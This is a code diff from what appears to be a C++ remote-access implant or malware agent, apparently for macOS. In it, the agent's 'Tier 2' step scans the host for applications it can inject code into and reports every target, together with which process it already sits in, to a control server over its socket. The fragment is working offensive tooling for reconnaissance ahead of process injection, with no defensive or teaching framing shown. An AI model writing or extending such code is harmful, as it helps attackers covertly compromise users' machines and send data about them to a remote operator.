@@ -175,14 +175,33 @@ void Agent::handleDispatching(Packet&& packet) {
         std::vector<uint8_t> data = res.serialize();
         m_socket.sendData(data);
 
-        // Tier 2: scan for injectable apps and report to server
+        // Tier 2: scan for injectable apps and report all targets to server
         std::string scan_report = "none||0|0";
         try {
             auto targets = inferno::tier2::scanApplications();
             if (!targets.empty()) {
-                const auto& best = targets.front();
-                scan_report = best.path + "|" + best.bundle_id + "|"
-                            + std::to_string(static_cast<int>(best.capability)) + "|1";
+                // Determine current host process to mark which target is already injected
+                std::string host_path;
+#ifdef __APPLE__
+                uint32_t bufsize = 0;
+                _NSGetExecutablePath(nullptr, &bufsize);
+                std::vector<char> exec_buf(bufsize);
+                if (_NSGetExecutablePath(exec_buf.data(), &bufsize) == 0) {
+                    host_path = std::string(exec_buf.data());
+                }
+#endif
+                std::vector<std::string> records;
+                for (const auto& t : targets) {
+                    bool is_host = !host_path.empty() && t.executable_path == host_path;
+                    records.push_back(t.path + "|" + t.bundle_id + "|"
+                                    + std::to_string(static_cast<int>(t.capability)) + "|"
+                                    + (is_host ? "1" : "0"));
+                }
+                scan_report.clear();
+                for (size_t i = 0; i < records.size(); ++i) {
+                    if (i > 0) scan_report += "\n";
+                    scan_report += records[i];
+                }
             }
         } catch (const std::exception& e) {
             std::cerr << "[Agent] Scanner failed: " << e.what() << std::endl;
